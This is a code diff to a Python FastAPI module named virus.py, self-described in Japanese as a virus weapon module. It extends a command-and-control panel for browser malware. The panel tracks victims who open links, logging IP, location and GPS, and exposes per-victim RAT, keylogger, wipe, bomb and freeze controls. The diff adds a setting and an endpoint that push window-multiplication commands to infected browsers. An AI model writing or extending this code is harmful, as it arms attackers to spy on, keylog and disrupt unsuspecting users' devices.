@@ -27,11 +27,11 @@ app/virus.py — ウイルス兵器モジュール
   /api/vp/{code}/state  現在状態
   /api/vp/{code}/stages 個体ごとの進行度＋全体の制圧率
   /api/vp/{code}/rat    個体別RAT/キーログ/DOM
+  /api/vp/{code}/winlock 窓増殖の設定（off/chain/breed・分岐・深さ）
 
-v3.4 修正:
-  再構成で欠けていた /vp ・/vp/add ・/vp/{code} ・/v/{code} ・API群・
-  _new_code/DEFAULT_NOTIFY/_sg_icon/_SG_PIL を復元。
-  SCHEMA から owner 列依存を外し、_db は executescript を try で保護。
+v3.5 追加:
+  窓増殖設定を監視室から保存できるようにした（DB: win_mode/win_branch/win_depth →
+  singularity の cfg(winLock) に流す）。env(SG_WIN_*) はフォールバックとして維持。
 """
 from __future__ import annotations
 
@@ -107,7 +107,8 @@ CREATE TABLE IF NOT EXISTS virus_links(
   winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
   notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
   level INTEGER DEFAULT 1, fixed INTEGER DEFAULT 0, wipe_seq INTEGER DEFAULT 0,
-  freeze TEXT DEFAULT '', bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT);
+  freeze TEXT DEFAULT '', bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT,
+  win_mode TEXT DEFAULT '', win_branch INTEGER DEFAULT 0, win_depth INTEGER DEFAULT 0);
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
@@ -193,7 +194,10 @@ def _migrate(c):
                       ("freeze", "TEXT DEFAULT ''"),
                       ("bomb", "TEXT DEFAULT ''"),
                       ("inj", "INTEGER DEFAULT 1"),
-                      ("ver", "TEXT")):
+                      ("ver", "TEXT"),
+                      ("win_mode", "TEXT DEFAULT ''"),
+                      ("win_branch", "INTEGER DEFAULT 0"),
+                      ("win_depth", "INTEGER DEFAULT 0")):
         if name not in cols:
             try:
                 c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
@@ -569,6 +573,9 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    inj=int(_val(row, "inj", 1) or 0),
                    defeat_at=SG_DEFEAT_AT,
                    stage_labels=SG_STAGE_LABEL, stage_colors=SG_STAGE_COLOR,
+                   win_mode=_val(row, "win_mode", "") or "",
+                   win_branch=int(_val(row, "win_branch", 0) or 0),
+                   win_depth=int(_val(row, "win_depth", 0) or 0),
                    modes=[(m, MODE_LABEL[m]) for m in MODES])
 
 
@@ -768,7 +775,7 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
 MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
 _GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 _SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
-_SG_VER = os.getenv("SG_APP_VER", "3.4")
+_SG_VER = os.getenv("SG_APP_VER", "3.5")
 _SG_INJ = os.getenv("SG_INJ", "1") != "0"
 _SG_RAT = os.getenv("SG_RAT", "1") != "0"
 _SG_SSE = os.getenv("SG_SSE", "1") != "0"
@@ -796,15 +803,29 @@ def _lv(v) -> int:
         return 1
 
 
-def _sg_win_lock():
-    """環境変数で窓の増殖を固定したいときのロック。未設定なら None（レベル準拠）。"""
-    if not _SG_WIN_MODE:
+def _sg_win_lock(row=None):
+    """窓増殖の設定。監視室の設定(DB) > 環境変数 > 未設定(None=レベル準拠)。"""
+    mode, branch, depth = "", 0, 0
+    if row is not None:
+        try:
+            mode = str(_val(row, "win_mode", "") or "")
+            branch = int(_val(row, "win_branch", 0) or 0)
+            depth = int(_val(row, "win_depth", 0) or 0)
+        except Exception:
+            mode, branch, depth = "", 0, 0
+    if mode not in ("off", "chain", "breed"):
+        mode = _SG_WIN_MODE if _SG_WIN_MODE in ("off", "chain", "breed") else ""
+    if not branch and _SG_WIN_BRANCH.isdigit():
+        branch = int(_SG_WIN_BRANCH)
+    if not depth and _SG_WIN_DEPTH.isdigit():
+        depth = int(_SG_WIN_DEPTH)
+    if not mode and not branch and not depth:
         return None
-    out = {"mode": _SG_WIN_MODE if _SG_WIN_MODE in ("off", "chain", "breed") else ""}
-    if _SG_WIN_BRANCH.isdigit():
-        out["branch"] = max(1, min(8, int(_SG_WIN_BRANCH)))
-    if _SG_WIN_DEPTH.isdigit():
-        out["depth"] = max(0, int(_SG_WIN_DEPTH))
+    out = {"mode": mode}
+    if branch:
+        out["branch"] = max(1, min(8, branch))
+    if depth:
+        out["depth"] = max(0, min(12, depth))
     return out
 
 
@@ -963,7 +984,7 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "level": lv, "fire": int(_val(row, "firing", 1) or 0),
         "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
         "installer": True, "code": code,
-        "winLock": _sg_win_lock(),
+        "winLock": _sg_win_lock(row),
         "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
         "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
         "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
@@ -1255,6 +1276,7 @@ def _sg_cmd_payload(owner, code, sid, sw=False):
            "fire": int(_val(row, "firing", 1) or 0),
            "freeze": _val(row, "freeze", "") or "",
            "wipe": int(_val(row, "wipe_seq", 0) or 0),
+           "win": _sg_win_lock(row),
            "ver": _SG_VER, "cmds": cmds, "server": _now()}
     c.close()
     return out
@@ -1475,6 +1497,10 @@ def _api_state(owner, code):
             "winset": int(_val(row, "winset", 100) or 0),
             "bomb": _val(row, "bomb", "") or "",
             "inj": int(_val(row, "inj", 1) or 0),
+            "win": _sg_win_lock(row),
+            "win_mode": _val(row, "win_mode", "") or "",
+            "win_branch": int(_val(row, "win_branch", 0) or 0),
+            "win_depth": int(_val(row, "win_depth", 0) or 0),
             "ver": _val(row, "ver", "") or _SG_VER,
             "hits": hn, "pending": pend, "server": _now()}
 
@@ -1665,6 +1691,56 @@ def api_cmd_clear(code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
+# --- 窓増殖（特異点） ---
+
+@router.post("/api/vp/{code}/winlock")
+async def api_winlock(request: Request, code: str, u=Depends(_auth)):
+    """窓増殖の設定（mode: '' / off / chain / breed、branch 1-8、depth 0-12）。空で既定。"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    mode = str(b.get("mode") or "").strip()
+    if mode not in ("", "off", "chain", "breed"):
+        mode = ""
+    try:
+        branch = int(b.get("branch") or 0)
+    except Exception:
+        branch = 0
+    try:
+        depth = int(b.get("depth") or 0)
+    except Exception:
+        depth = 0
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("UPDATE virus_links SET win_mode=?, win_branch=?, win_depth=? WHERE code=?",
+              (mode, max(0, min(8, branch)), max(0, min(12, depth)), code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/win")
+async def api_win(request: Request, code: str, u=Depends(_auth)):
+    """今すぐ窓を増やす（win コマンドを配る）。"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    try:
+        n = int(b.get("n") or 3)
+    except Exception:
+        n = 3
+    n = max(1, min(50, n))
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, "", "win", str(n), _now()))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
 # ===========================================================================
 # 感染判定と進行度（踏んだ個体ごとの「倒せたか」／全体の制圧率）
 # ===========================================================================
@@ -1791,6 +1867,7 @@ def api_stages(code: str, u=Depends(_auth)):
                       "device": h.get("device"), "os": h.get("os"),
                       "browser": h.get("browser"), "country": h.get("country"),
                       "city": h.get("city"), "vid": h.get("vid") or "",
+                      "is_bot": int(h.get("is_bot") or 0),
                       "gps": (h.get("gps_lat") is not None),
                       "last": (last.get(h["id"]) or ("", ""))[0],
                       "last_ts": (last.get(h["id"]) or ("", ""))[1]}
